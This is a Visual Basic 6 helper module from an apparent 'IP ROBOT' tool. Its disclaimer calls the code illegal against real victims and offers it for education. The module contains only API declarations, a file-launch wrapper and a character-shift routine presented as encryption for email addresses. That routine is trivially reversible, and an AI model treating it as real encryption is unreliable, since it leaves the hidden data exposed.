Attribute VB_Name = "mdlRobot"
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Const BIF_RETURNONLYFSDIRS = 1
Public Const BIF_DONTGOBELOWDOMAIN = 2
Public Const MAX_PATH = 260
Declare Function SHBrowseForFolder Lib "shell32" (lpbi As BrowseInfo) As Long
Declare Function SHGetPathFromIDList Lib "shell32" (ByVal pidList As Long, ByVal lpBuffer As String) As Long
Declare Function lstrcat Lib "kernel32" Alias "lstrcatA" (ByVal lpString1 As String, ByVal lpString2 As String) As Long

Public Type BrowseInfo
    hWndOwner As Long
    pIDLRoot As Long
    pszDisplayName As Long
    lpszTitle As Long
    ulFlags As Long
    lpfnCallback As Long
    lParam As Long
    iImage As Long
End Type

Public Const conSwNormal = 1
Public vFileName As String
Public MyNow As Date
Public LogClearDate, strAppPath As String
Public DayHist, DayLog, HourHist, HourLog As String
Public strLogLife As String
Public CriticalFreeSpace As String
Public boStopTimer As Boolean         'Set to True if user decides to interrupt an on-going conversion process
Public dblFreeSpace, dblTotalSize As Double
Public Enum BOX
    TXT_FROM
    TXT_TO
End Enum
Public TheBox As BOX  'This line needs to be down here (under the above Enum block)

Public Sub vLaunch(vFile As String)
    ShellExecute hWnd, "open", vFile, vbNullString, vbNullString, conSwNormal
End Sub

Public Function EncryptIt(strPlainText) As String
    'This function converts any given text into enrypted unreadable text.
    'Set to encrypt e-mail addresses - coded by uniso...
    
    On Error GoTo ErrHandeler
    
    Dim i As Byte
    Dim strTemp, strEnc, strWhole As String
    
    For i = 1 To Len(strPlainText)
        strTemp = Mid(strPlainText, i, 1)
        strEnc = Asc(strTemp) + ((Len(strPlainText) + i))
        strEnc = Chr(strEnc)
        strWhole = strWhole & strEnc
    Next i
    EncryptIt = strWhole
    Exit Function
ErrHandeler:
   MsgBox Err.Description, , "IP ROBOT"
End Function

Public Function DecryptIt(strEnc As String) As String
    'This function converts decrypted text into readable text.
    'Set to decrypt e-mail addresses - coded by uniso...

    Dim strTemp, strCode, strPlainText As String
    Dim i As Byte
      
    For i = 1 To Len(strEnc)
        strTemp = Mid(strEnc, i, 1)
        strCode = Asc(strTemp) - ((Len(strEnc) + i))
        strCode = Chr(strCode)
        strPlainText = strPlainText & strCode
    Next i
    DecryptIt = strPlainText
End Function
